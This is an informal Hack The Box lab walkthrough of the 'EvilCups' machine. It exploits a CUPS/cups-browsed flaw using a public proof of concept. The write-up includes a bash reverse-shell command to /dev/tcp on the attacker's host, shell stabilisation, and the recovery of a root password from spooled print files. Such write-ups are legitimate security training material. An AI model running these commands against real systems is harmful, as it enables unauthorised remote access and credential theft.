Hey my name is Jack and this is my write up for the EvilCups machine on Hackthebox.

Machine IP: 10.10.11.40


Like usual I start with enumerating the network which shows that port 631 and port 22 open. Specifically port 631 is running Cups  CUPS 2.4.2. Ive already done my research on this vuln so im somewhat familiar and recognize that port 631 is cups-browsed. https://www.evilsocket.net/2024/09/26/Attacking-UNIX-systems-via-CUPS-Part-I/#What-is-cups-browsed. This write up is very helpful.

Im gonna use Ippsecs POC to try to add a malicious printer. 
https://github.com/IppSec/evil-cups.git  

I also during my research find out that if i navigate to 
http://10.10.11.40:631/ I will get a webpage for Cups administration. So my workflow is basically gonna be. 1. Add Printer, 2. find a way to trigger this code being ran on website.

I look inside of the source code of the expliot and the syntax is pretty easy to understand
```
if __name__ == "__main__":
    if len(sys.argv) != 4:
        print("%s <LOCAL_HOST> <TARGET_HOST> <COMMAND>" % sys.argv[0])
        quit()

```

so i send 

python3 evilcups.py 10.10.14.16 10.10.11.40 'bash -c "bash -i >& /dev/tcp/10.10.14.16/443 0>&1"'

After 30 seconds the printer appears 

Then i go onto the web page and select print test page which gives me a reverse shell as the user lp.



I stablize the shell with 
python3 -c 'import pty; pty.spawn("/bin/bash")'





I mess with Linpeas but dont really find anything interesting so I decide to look at the cups documentation and see that printed files are stored in /var/spool/cups. and I keep getting kicked out of my shell. 

I dont have view permissions for the /var/spool/cups directory so i cant list files in the directory, how I challenge this is by feeding all the documentation to chatgpt and it tells me that For example, if the print job ID is 1, the control file would be `/var/spool/cups/c00001`, and the data file might be `/var/spool/cups/d00001-001` (depending on the number of data files submitted with the job). so i do cat d00001-001 which returns alot of info so i feed it into chatgpt and ask if they see a password and find the password is Br3@k-G!@ss-r00t-evilcups.


ALSO IDK WHY BUT I KEEP GETTING KICKED OUT OF THIS BOX. *I think it has to do with the fact that printers are refreshed after a certain amount of time and so my malicious printer stops executing its reverse shell*

But with that password I ssh into root@evilcups and get root.txt

PWNED!

